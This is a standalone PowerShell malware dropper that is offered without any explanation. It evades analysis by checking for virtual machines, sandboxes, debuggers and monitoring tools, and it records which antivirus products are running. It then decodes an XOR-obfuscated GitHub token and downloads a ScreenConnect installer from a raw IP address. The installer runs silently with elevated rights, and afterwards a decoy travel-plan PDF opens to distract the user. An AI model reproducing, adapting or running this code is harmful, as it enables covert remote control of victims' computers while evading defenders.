$ErrorActionPreference = 'SilentlyContinue'
$state = New-Object System.Collections.ArrayList

$sb = $false
$cs  = Get-WmiObject Win32_ComputerSystem
$mem = $cs.TotalPhysicalMemory
$cpu = (Get-WmiObject Win32_Processor).NumberOfCores

if ($cs.Model -match 'VirtualBox|VMware|QEMU|Xen|Virtual Machine') { $sb = $true }
if ($mem -lt 2GB)  { $sb = $true }
if ($cpu -lt 2)    { $sb = $true }
if ($env:USERNAME -eq 'Bruno') { $sb = $true }

$toolProcs = 'vboxservice|vboxtray|VGAuthService|vmtoolsd|SbieSvc|Procmon|proc_exp|wireshark|dumpcap|ollydbg|x64dbg|ida64|fakenet|windbg'
if (Get-Process | Where-Object { $_.Name -match $toolProcs }) { $sb = $true }

[void]$state.Add("sandbox=$sb")
[void]$state.Add("ram=$mem")
[void]$state.Add("cores=$cpu")

if ($sb) {
    [void]$state.Add('state=sandbox-exit')
    [IO.File]::WriteAllText((Join-Path $env:TEMP 'value.txt'), ($state -join "`n"))
    Clear-History
    exit
}

$avProcs = 'MsMpEng|avp|avgnt|avguard|ekrn|bdagent|ccSvcHst|mbamservice|NortonSecurity|V3Svc|SAVService|McAfeeFramework'
$found = @(Get-Process | Where-Object { $_.Name -match $avProcs } |
    Select-Object -ExpandProperty Name -Unique)
[void]$state.Add("av=$($found -join ',')")

[void]$state.Add('state=ok')
[IO.File]::WriteAllText((Join-Path $env:TEMP 'value.txt'), ($state -join "`n"))

$DecoyApi = 'https://api.github.com/repos/rotalbilly5-sketch/Dream/contents/Travel-Meeting-Plan-Q4-2026.pdf'
$DecoyPath = Join-Path $env:TEMP 'Travel-Meeting-Plan-Q4-2026.pdf'
$GhTokenX = @(77,67,94,66,95,72,117,90,75,94,117,27,27,105,107,100,97,97,109,99,26,67,111,120,123,65,29,104,111,114,73,24,73,117,19,88,25,71,66,95,18,71,31,27,90,99,69,65,127,26,89,69,82,65,73,111,68,99,95,88,77,71,83,65,103,69,114,100,25,127,68,92,67,75,124,24,108,107,110,124,114,123,96,100,115,109,107,97,107,126,26,103,104)
$GhToken = -join ($GhTokenX | ForEach-Object { [char]($_ -bxor 42) })

$msi = Join-Path $env:TEMP "$([IO.Path]::GetRandomFileName()).msi"
$PayloadUrl = 'http://45.32.223.57:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $wc = New-Object Net.WebClient
    $data = $wc.DownloadData($PayloadUrl)
    [IO.File]::WriteAllBytes($msi, $data)
    Unblock-File -Path $msi -ErrorAction SilentlyContinue
    $proc = Start-Process msiexec.exe -Verb RunAs -ArgumentList "/i `"$msi`" /qn /norestart" -WindowStyle Hidden -PassThru -Wait
    if ($proc.ExitCode -eq 0) {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $hdrs = @{"Authorization"="token $GhToken"; "Accept"="application/vnd.github.v3+json"}
        $resp = Invoke-RestMethod -Uri $DecoyApi -Headers $hdrs
        [IO.File]::WriteAllBytes($DecoyPath, [Convert]::FromBase64String($resp.content))
        Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "`"$DecoyPath`""
    }
} catch {}
